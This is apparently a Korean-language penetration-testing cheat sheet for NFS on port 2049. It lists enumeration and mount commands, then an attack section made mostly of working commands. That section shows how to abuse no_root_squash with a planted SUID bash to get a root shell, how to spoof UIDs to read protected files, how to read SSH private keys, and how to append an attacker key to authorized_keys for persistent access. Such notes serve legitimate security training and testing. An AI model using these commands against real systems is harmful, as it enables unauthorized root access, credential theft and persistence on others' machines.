# NFS (2049)

Network File System. 네트워크 파일 공유. 설정이 잘못되면 중요 파일에 접근 가능.

---

## 열거

```bash
# 공유 목록 확인
showmount -e TARGET

# nmap
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
nmap --script=rpcinfo -p 111 TARGET

# rpcinfo로 NFS 서비스 확인
rpcinfo -p TARGET | grep nfs
```

---

## 마운트

```bash
# 마운트
mkdir /tmp/nfs
mount -t nfs TARGET:/share /tmp/nfs

# 특정 NFS 버전
mount -t nfs -o vers=3 TARGET:/share /tmp/nfs
mount -t nfs -o vers=2 TARGET:/share /tmp/nfs

# nolock 옵션 (NLM 문제 시)
mount -t nfs -o nolock TARGET:/share /tmp/nfs

# 마운트 해제
umount /tmp/nfs
```

---

## 공격

### Root Squashing 우회

`no_root_squash` 설정이 있으면 root 권한으로 파일 접근/생성 가능.

```bash
# /etc/exports 확인 (NFS 서버에서)
# /share *(rw,no_root_squash)  → root 접근 가능
# /share *(rw,root_squash)    → root → nfsnobody로 매핑됨

# no_root_squash인 경우: SUID 바이너리 배치
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# target에서: /share/bash -p → root 쉘
```

### UID/GID 스푸핑

```bash
# NFS에서 파일 접근 권한은 UID/GID 기반
# target 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성

# 파일 소유자 확인
ls -ln /tmp/nfs/

# 해당 UID로 로컬 사용자 생성
useradd -u 1001 fakeuser
su - fakeuser
cat /tmp/nfs/sensitive_file
```

### SSH 키 탈취/배치

```bash
# .ssh directory 접근 가능 시
cat /tmp/nfs/home/user/.ssh/id_rsa

# authorized_keys에 공격자 키 추가
echo "ATTACKER_PUBKEY" >> /tmp/nfs/home/user/.ssh/authorized_keys
```

---

## Nmap NSE

```bash
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
```
